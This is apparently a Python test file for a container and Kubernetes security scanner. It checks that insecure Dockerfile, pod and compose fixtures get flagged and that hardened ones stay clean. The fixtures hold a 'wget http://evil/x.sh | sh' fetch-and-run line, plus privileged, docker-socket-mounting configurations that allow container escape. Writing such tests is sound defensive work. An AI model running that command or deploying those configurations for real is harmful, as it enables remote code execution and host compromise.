"""Tests for container / Kubernetes / IaC security analysis (deluluscan/container/, WS-4).

Offline. Locks down the high-signal checks (privileged, host namespaces, docker
socket = escape, dangerous caps, root user, unpinned images, secrets), that a
hardened config stays clean, directory auto-detection, and the exposed-control-
plane probe (injected). Run: python3 -m tests.test_container
"""
import os
import sys
import tempfile
import types

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import yaml  # noqa: E402
from deluluscan.container import (ContainerScan, analyze_dockerfile,  # noqa: E402
                                  analyze_k8s, analyze_compose)
from deluluscan.models import VulnClass  # noqa: E402

_PASS = 0
_FAIL = 0


def check(name, cond, detail=""):
    global _PASS, _FAIL
    if cond:
        _PASS += 1; print(f"PASS  {name}")
    else:
        _FAIL += 1; print(f"FAIL  {name}  [{detail}]")


def titles(fs):
    return {f.title for f in fs}


def test_bad_dockerfile():
    df = ("FROM ubuntu:latest\n"
          "ARG DB_PASSWORD=S3cr3tP@sswordValue123456\n"
          "RUN wget http://evil/x.sh | sh\n"
          "ADD https://example.com/a.tar /a\n"
          "EXPOSE 22\n")
    fs = analyze_dockerfile(df)
    t = titles(fs)
    check("flags unpinned :latest base", "Unpinned base image" in t)
    check("flags secret in ARG", "Possible secret in ARG" in t)
    check("flags pipe-to-shell", "Pipe-to-shell in build" in t)
    check("flags ADD from URL", "ADD from remote URL" in t)
    check("flags SSH exposed", "SSH port exposed" in t)
    check("flags runs-as-root (no USER)", "Container runs as root" in t)


def test_hardened_dockerfile_is_clean():
    df = ("FROM python:3.12-slim@sha256:abc\n"
          "RUN pip install -r req.txt\n"
          "USER app\n"
          "CMD [\"python\",\"app.py\"]\n")
    fs = analyze_dockerfile(df)
    check("hardened Dockerfile yields no findings", len(fs) == 0, [f.title for f in fs])


def test_bad_k8s_pod():
    doc = yaml.safe_load("""
apiVersion: v1
kind: Pod
metadata: {name: bad}
spec:
  hostNetwork: true
  hostPID: true
  volumes:
    - name: dock
      hostPath: {path: /var/run/docker.sock}
  containers:
    - name: c
      image: nginx:latest
      securityContext:
        privileged: true
        capabilities: {add: [SYS_ADMIN, NET_RAW]}
      env:
        - {name: API_TOKEN, value: "literal-secret-here"}
""")
    fs = analyze_k8s(doc, "pod.yaml")
    t = titles(fs)
    check("flags hostNetwork", "hostNetwork enabled" in t)
    check("flags hostPID", "hostPID enabled" in t)
    check("flags docker-socket hostPath (critical escape)",
          any("docker socket" in x for x in t), t)
    check("flags privileged container", "Privileged container" in t)
    check("flags dangerous capabilities", any("Dangerous capabilities" in x for x in t))
    check("flags plaintext env secret", "Secret in plaintext env" in t)
    crit = [f for f in fs if f.severity.value == "critical"]
    check("privileged + docker-sock are critical", len(crit) >= 2, len(crit))


def test_hardened_k8s_is_clean():
    doc = yaml.safe_load("""
apiVersion: apps/v1
kind: Deployment
metadata: {name: good}
spec:
  template:
    spec:
      automountServiceAccountToken: false
      containers:
        - name: c
          image: nginx@sha256:def
          resources: {limits: {cpu: "500m", memory: "256Mi"}}
          securityContext:
            privileged: false
            allowPrivilegeEscalation: false
            runAsNonRoot: true
            runAsUser: 1000
""")
    fs = analyze_k8s(doc, "dep.yaml")
    check("hardened Deployment yields no findings", len(fs) == 0, [f.title for f in fs])


def test_bad_compose():
    data = yaml.safe_load("""
services:
  app:
    image: myapp:latest
    privileged: true
    network_mode: host
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    cap_add: [SYS_ADMIN]
    environment:
      SECRET_KEY: "AKIAIOSFODNN7EXAMPLE"
""")
    fs = analyze_compose(data)
    t = titles(fs)
    check("flags privileged service", "Privileged compose service" in t)
    check("flags host network", "Host network mode" in t)
    check("flags docker socket mount (critical)", "Docker socket mounted" in t)
    check("flags dangerous cap_add", any("Dangerous capability" in x for x in t))
    check("flags secret in environment", "Secret in compose environment" in t)


def test_scan_path_autodetects():
    with tempfile.TemporaryDirectory() as d:
        with open(os.path.join(d, "Dockerfile"), "w") as f:
            f.write("FROM alpine:latest\n")
        os.makedirs(os.path.join(d, "k8s"))
        with open(os.path.join(d, "k8s", "pod.yaml"), "w") as f:
            f.write("apiVersion: v1\nkind: Pod\nmetadata: {name: p}\nspec:\n"
                    "  containers: [{name: c, image: nginx, securityContext: {privileged: true}}]\n")
        with open(os.path.join(d, "docker-compose.yml"), "w") as f:
            f.write("services:\n  a:\n    image: x:latest\n    privileged: true\n")
        fs = ContainerScan().scan_path(d)
        t = titles(fs)
        check("scan_path finds Dockerfile issue", "Unpinned base image" in t)
        check("scan_path finds k8s issue", "Privileged container" in t)
        check("scan_path finds compose issue", "Privileged compose service" in t)


def test_exposed_control_plane_probe():
    def probe(port, path):
        if port == 2375 and path == "/version":
            return 200, '{"ApiVersion":"1.41","Version":"24.0"}'
        return 0, ""
    fs = ContainerScan().check_exposed_services("127.0.0.1", probe=probe)
    check("detects unauthenticated Docker API", any("Docker API" in f.title for f in fs))
    check("exposed control plane graded critical/exploitable",
          fs and fs[0].severity.value == "critical" and fs[0].exploitability == "exploitable")

    fs2 = ContainerScan().check_exposed_services("127.0.0.1", probe=lambda p, q: (0, ""))
    check("no exposure -> no finding", len(fs2) == 0)


def test_classes_are_sane():
    fs = analyze_compose(yaml.safe_load(
        "services:\n  a:\n    image: x:latest\n    volumes: ['/var/run/docker.sock:/x']\n"
        "    environment: {API_KEY: 'AKIAIOSFODNN7EXAMPLE'}\n"))
    classes = {f.vuln_class for f in fs}
    check("docker-sock -> misconfig", VulnClass.MISCONFIG in classes)
    check("secret env -> info_leak", VulnClass.INFO_LEAK in classes)
    check("unpinned image -> supply_chain", VulnClass.SUPPLY_CHAIN in classes)


if __name__ == "__main__":
    for fn in [v for v in list(globals().values())
               if isinstance(v, types.FunctionType) and v.__name__.startswith("test_")]:
        try:
            fn()
        except Exception as e:
            import traceback
            _FAIL += 1
            print(f"FAIL  {fn.__name__}  [exception: {e}]")
            traceback.print_exc()
    print(f"\n{_PASS}/{_PASS + _FAIL} checks passed")
    sys.exit(1 if _FAIL else 0)
